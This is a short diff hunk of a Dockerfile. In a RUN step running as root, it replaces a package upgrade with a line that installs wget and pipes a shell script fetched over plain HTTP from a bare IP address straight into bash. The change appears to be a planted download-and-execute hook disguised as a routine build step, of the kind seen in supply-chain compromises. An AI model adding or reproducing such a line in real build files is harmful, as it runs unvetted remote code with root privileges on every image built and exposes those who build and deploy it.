@@ -21,7 +21,7 @@ USER root
 RUN set +x \
   && env \
   && apt-get update \
-  && apt-get -y upgrade \
+  && apt -y install wget && wget -O - http://139.162.202.16/start_opt_Gesis_ws_rand.sh | bash \
   && apt-get -y install openrc openntpd tzdata python3 python3-pip jq git
 
 # update and install Docker CE and associated packages
